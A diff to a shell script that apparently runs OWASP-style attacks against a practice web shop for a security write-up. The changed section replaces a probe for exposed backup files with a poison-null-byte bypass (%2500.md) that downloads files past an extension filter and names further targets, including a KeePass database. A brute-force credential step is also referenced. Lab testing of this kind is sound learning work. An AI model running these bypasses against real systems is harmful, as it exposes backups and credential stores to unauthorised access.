@@ -67,13 +67,15 @@ else
 fi
 note "confirm in browser: search the payload, watch it execute -> assets/03-xss.png"
 
-# 5) BROKEN ACCESS CONTROL / sensitive files (A01) -----------------------------
-hr "5. Broken access control — sensitive files via /ftp"
-for f in package.json.bak coupons_2013.md.bak www-data ; do
-  code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 6 "$TARGET/ftp/$f")
-  printf '   /ftp/%-22s HTTP %s\n' "$f" "$code"
-done
-note "downloadable backup/source files = information disclosure -> assets/04-ftp.png"
+# 5) BROKEN ACCESS CONTROL / poison null byte (A01) ----------------------------
+hr "5. Broken access control — /ftp sensitive files (poison null byte)"
+direct=$(curl -s -o /dev/null -w '%{http_code}' --max-time 6 "$TARGET/ftp/coupons_2013.md.bak")
+bypass=$(curl -s -o /dev/null -w '%{http_code}' --max-time 6 "$TARGET/ftp/coupons_2013.md.bak%2500.md")
+printf '   /ftp/coupons_2013.md.bak           HTTP %s  (blocked by extension filter)\n' "$direct"
+printf '   /ftp/coupons_2013.md.bak%%2500.md   HTTP %s  (poison null byte bypass)\n' "$bypass"
+[ "$bypass" = "200" ] && echo "   VULNERABLE ✓ — extension filter bypassed; backups downloadable"
+note "also: acquisitions.md (direct), package.json.bak%2500.md, incident-support.kdbx%2500.md (KeePass)"
+note "evidence -> writeups/assets/06-nullbyte-403-vs-200.png (see writeups/06-…)"
 
 # 6) BRUTE FORCE (opt-in, noisy) -----------------------------------------------
 hr "6. Brute force — credential attack (A07)  [opt-in: --brute]"
